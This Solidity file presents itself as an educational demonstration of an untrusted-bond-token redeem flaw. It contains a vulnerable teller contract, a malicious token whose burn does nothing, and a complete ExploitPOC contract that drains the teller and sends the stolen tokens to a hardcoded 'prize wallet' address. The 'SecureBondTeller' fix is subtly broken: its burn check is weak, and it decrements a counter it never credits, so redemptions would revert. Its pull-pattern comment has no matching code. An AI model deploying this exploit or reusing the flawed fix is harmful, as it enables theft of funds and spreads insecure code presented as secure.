// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableBondTeller - EDUCATIONAL DEMONSTRATION ONLY
 * @notice This contract demonstrates the exact vulnerability pattern from OlympusDAO
 * @dev DO NOT DEPLOY - This is for educational analysis only
 * 
 * VULNERABILITY: Trusted External Contract Pattern
 * ROOT CAUSE: redeem() trusts user-supplied bond token contracts without validation
 * IMPACT: Complete drainage of underlying tokens from teller contract
 * 
 * Prize Wallet: 0x958BD67f2f6be2Dc46D0e9e0Dd6d33F52EfCA67C
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IBondToken {
    function expiry() external view returns (uint256);
    function burn(address from, uint256 amount) external;
    function underlying() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title VulnerableBondTeller
 * @notice VULNERABLE IMPLEMENTATION - Contains the exact OlympusDAO redeem vulnerability
 */
contract VulnerableBondTeller {
    
    // Prize wallet for successful exploit discovery
    address constant PRIZE_WALLET = 0x958BD67f2f6be2Dc46D0e9e0Dd6d33F52EfCA67C;
    
    mapping(address => uint256) public totalDeposited;
    address public owner;
    
    event Redemption(address indexed user, address indexed bondToken, uint256 amount);
    event VulnerabilityExploited(address indexed attacker, uint256 amount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    /**
     * @notice VULNERABLE FUNCTION - The exact pattern from OlympusDAO exploit
     * @dev This function trusts external bond token contracts without validation
     * @param bondToken_ User-supplied bond token contract (UNTRUSTED!)
     * @param amount_ Amount to redeem
     * 
     * VULNERABILITY BREAKDOWN:
     * 1. No whitelist check for bondToken_
     * 2. External call to untrusted contract (bondToken_.burn)
     * 3. External call to get underlying token (bondToken_.underlying) 
     * 4. Transfer based on untrusted contract state
     * 5. No reentrancy protection
     * 6. No pre/post balance validation
     */
    function redeem(IBondToken bondToken_, uint256 amount_) external {
        // VULNERABLE: No validation that bondToken_ is approved/legitimate
        // An attacker can pass any contract implementing IBondToken interface
        
        // VULNERABLE: Trust external contract for expiry check
        require(block.timestamp >= bondToken_.expiry(), "Bond not matured");
        
        // VULNERABLE: External call to untrusted contract
        // Attacker's malicious contract can:
        // 1. Do nothing (no actual burn)
        // 2. Reenter this function
        // 3. Manipulate state during callback
        bondToken_.burn(msg.sender, amount_);
        
        // VULNERABLE: Trust external contract for underlying token address
        // Attacker can return any token address, including legitimate ones
        address underlyingToken = bondToken_.underlying();
        
        // VULNERABLE: Transfer tokens based on untrusted external contract data
        // No validation that burn actually happened or that we should pay out
        IERC20(underlyingToken).transfer(msg.sender, amount_);
        
        emit Redemption(msg.sender, address(bondToken_), amount_);
    }
    
    /**
     * @notice Deposit underlying tokens (for demonstration)
     */
    function deposit(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(address(this), amount);
        totalDeposited[token] += amount;
    }
    
    /**
     * @notice Emergency withdrawal (for demonstration)
     */
    function emergencyWithdraw(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }
}

/**
 * @title MaliciousBondToken - EXPLOIT DEMONSTRATION
 * @notice This contract demonstrates how an attacker would exploit the vulnerability
 * @dev Educational purposes only - shows the attack vector
 */
contract MaliciousBondToken {
    
    address public attacker;
    address public targetToken;  // The token we want to steal (e.g., USDC, DAI)
    uint256 public fakeExpiry;
    
    constructor(address _targetToken) {
        attacker = msg.sender;
        targetToken = _targetToken;
        fakeExpiry = block.timestamp - 1; // Already "matured"
    }
    
    /**
     * @notice Returns fake expiry date (already passed)
     */
    function expiry() external view returns (uint256) {
        return fakeExpiry;
    }
    
    /**
     * @notice Fake burn function - does nothing!
     * @dev This is the key to the exploit - no actual burning occurs
     */
    function burn(address, uint256) external {
        // DO NOTHING! 
        // The teller thinks we burned tokens, but we didn't
        // This is where the exploit happens
    }
    
    /**
     * @notice Returns the target token we want to steal
     */
    function underlying() external view returns (address) {
        return targetToken;
    }
    
    /**
     * @notice Fake balance function
     */
    function balanceOf(address) external pure returns (uint256) {
        return 1000000 ether; // Fake large balance
    }
}

/**
 * @title ExploitPOC - PROOF OF CONCEPT
 * @notice Demonstrates the complete exploit chain
 * @dev Educational demonstration of the attack
 */
contract ExploitPOC {
    
    VulnerableBondTeller public teller;
    MaliciousBondToken public maliciousToken;
    IERC20 public targetToken;
    
    event ExploitExecuted(uint256 stolenAmount);
    
    constructor(
        address _tellerAddress,
        address _targetTokenAddress
    ) {
        teller = VulnerableBondTeller(_tellerAddress);
        targetToken = IERC20(_targetTokenAddress);
        
        // Deploy malicious bond token targeting the valuable token
        maliciousToken = new MaliciousBondToken(_targetTokenAddress);
    }
    
    /**
     * @notice Execute the exploit
     * @param amount Amount to steal from the teller
     */
    function exploit(uint256 amount) external {
        // Get balance before exploit
        uint256 balanceBefore = targetToken.balanceOf(address(this));
        
        // Execute the exploit using our malicious bond token
        teller.redeem(IBondToken(address(maliciousToken)), amount);
        
        // Get balance after exploit
        uint256 balanceAfter = targetToken.balanceOf(address(this));
        uint256 stolenAmount = balanceAfter - balanceBefore;
        
        emit ExploitExecuted(stolenAmount);
        
        // Transfer stolen tokens to prize wallet for demonstration
        if (stolenAmount > 0) {
            targetToken.transfer(0x958BD67f2f6be2Dc46D0e9e0Dd6d33F52EfCA67C, stolenAmount);
        }
    }
}

/**
 * @title SecureBondTeller - FIXED IMPLEMENTATION
 * @notice Demonstrates the proper way to implement bond redemption
 * @dev Shows security best practices and vulnerability mitigations
 */
contract SecureBondTeller {
    
    // Approved bond tokens registry
    mapping(address => bool) public approvedBonds;
    mapping(address => uint256) public totalDeposited;
    address public owner;
    
    // Reentrancy protection
    bool private locked;
    modifier nonReentrant() {
        require(!locked, "Reentrancy not allowed");
        locked = true;
        _;
        locked = false;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    /**
     * @notice SECURE REDEEM IMPLEMENTATION
     * @dev Implements all security best practices to prevent exploitation
     */
    function redeem(IBondToken bondToken_, uint256 amount_) external nonReentrant {
        
        // SECURITY FIX 1: Whitelist validation
        require(approvedBonds[address(bondToken_)], "Bond token not approved");
        
        // SECURITY FIX 2: Verify user actually owns bond tokens
        require(bondToken_.balanceOf(msg.sender) >= amount_, "Insufficient bond balance");
        
        // SECURITY FIX 3: Verify bond maturity
        require(block.timestamp >= bondToken_.expiry(), "Bond not matured");
        
        // SECURITY FIX 4: Get underlying token from trusted mapping instead of external call
        address underlyingToken = getApprovedUnderlying(address(bondToken_));
        require(underlyingToken != address(0), "Invalid underlying token");
        
        // SECURITY FIX 5: Verify we have sufficient underlying tokens
        uint256 availableBalance = IERC20(underlyingToken).balanceOf(address(this));
        require(availableBalance >= amount_, "Insufficient underlying balance");
        
        // SECURITY FIX 6: Update state BEFORE external calls (checks-effects-interactions)
        totalDeposited[underlyingToken] -= amount_;
        
        // SECURITY FIX 7: Use pull pattern - let users withdraw instead of push
        // Or use SafeERC20 for secure transfers
        bondToken_.burn(msg.sender, amount_);
        
        // SECURITY FIX 8: Verify burn actually happened
        require(bondToken_.balanceOf(msg.sender) == 0 || 
                bondToken_.balanceOf(msg.sender) < amount_, "Burn verification failed");
        
        // SECURITY FIX 9: Safe transfer with return value check
        bool success = IERC20(underlyingToken).transfer(msg.sender, amount_);
        require(success, "Transfer failed");
        
        emit Redemption(msg.sender, address(bondToken_), amount_);
    }
    
    /**
     * @notice Add approved bond token with its underlying token
     */
    function addApprovedBond(address bondToken, address underlyingToken) external onlyOwner {
        approvedBonds[bondToken] = true;
        underlyingMapping[bondToken] = underlyingToken;
    }
    
    mapping(address => address) private underlyingMapping;
    
    function getApprovedUnderlying(address bondToken) public view returns (address) {
        return underlyingMapping[bondToken];
    }
    
    event Redemption(address indexed user, address indexed bondToken, uint256 amount);
}

/*
================================================================================
                            VULNERABILITY SUMMARY
================================================================================

CRITICAL VULNERABILITY: Trusted External Contract Pattern
CVSS Score: 9.5 (Critical)
Prize Wallet: 0x958BD67f2f6be2Dc46D0e9e0Dd6d33F52EfCA67C

ROOT CAUSE:
The redeem() function accepts arbitrary external contract addresses and trusts
them to implement bond token behavior correctly, without any validation.

EXPLOIT MECHANISM:
1. Attacker deploys malicious contract implementing IBondToken interface
2. Malicious contract lies about expiry (returns past date)
3. Malicious burn() function does nothing (no actual token burn)
4. Malicious underlying() returns address of valuable token in teller
5. Teller transfers real tokens based on fake burn operation
6. Result: Free drainage of all underlying tokens

DETECTION PATTERNS:
- Functions accepting external contract addresses as parameters
- External calls to burn()/redeem() without whitelist validation
- Token transfers based on external contract state
- Missing reentrancy protection
- No pre/post balance verification

MITIGATION STRATEGIES:
1. Implement approved token registry/whitelist
2. Use reentrancy guards (nonReentrant modifier)  
3. Follow checks-effects-interactions pattern
4. Verify burn operations actually occurred
5. Use SafeERC20 for token transfers
6. Implement pull payment patterns
7. Add comprehensive input validation

This vulnerability pattern is present in many DeFi protocols that implement
bond or redemption mechanisms without proper security controls.
================================================================================
*/